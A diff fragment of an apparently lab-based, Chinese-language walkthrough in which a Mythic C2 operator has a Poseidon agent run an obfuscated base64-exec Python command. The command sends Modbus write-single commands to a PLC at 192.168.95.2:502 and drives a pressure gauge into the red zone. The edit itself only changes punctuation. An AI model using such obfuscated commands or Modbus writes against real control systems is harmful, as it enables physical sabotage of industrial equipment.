@@ -155,8 +155,8 @@ shell python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgc3Ryd
 - 幾秒內 3D dashboard 壓力表衝進紅區
 
 背景發生的事: Mythic 把 task 排進 callback 佇列, Poseidon 下次 HTTP checkin 拉到後
-fork/exec 那段指令; Python 解 base64 執行內含的 Modbus 寫入; 五筆 write-single 打向
-`192.168.95.2:502`, PLC 每筆回 ack; Poseidon 收 stdout 當 response 傳回 Mythic; UI
+fork/exec 那段指令, Python 解 base64 執行內含的 Modbus 寫入, 五筆 write-single 打向
+`192.168.95.2:502`, PLC 每筆回 ack, Poseidon 收 stdout 當 response 傳回 Mythic, UI
 render 給 operator
 
 
